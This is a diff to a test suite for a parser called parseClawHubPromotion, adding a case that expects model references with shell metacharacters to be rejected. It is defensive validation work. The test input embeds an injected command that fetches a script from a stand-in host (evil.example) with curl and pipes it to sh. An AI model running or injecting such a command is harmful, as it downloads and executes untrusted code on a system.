@@ -42,6 +42,15 @@ describe("parseClawHubPromotion", () => {
     expect(() => parseClawHubPromotion({ ...validPromotion, slug: "UPPER-case" })).toThrow(/slug/);
   });
 
+  it("rejects model refs with shell metacharacters", () => {
+    expect(() =>
+      parseClawHubPromotion({
+        ...validPromotion,
+        models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }],
+      }),
+    ).toThrow(/unsupported characters/);
+  });
+
   it("rejects non-string model refs", () => {
     expect(() => parseClawHubPromotion({ ...validPromotion, models: [{ modelRef: 42 }] })).toThrow(
       /modelRef/,
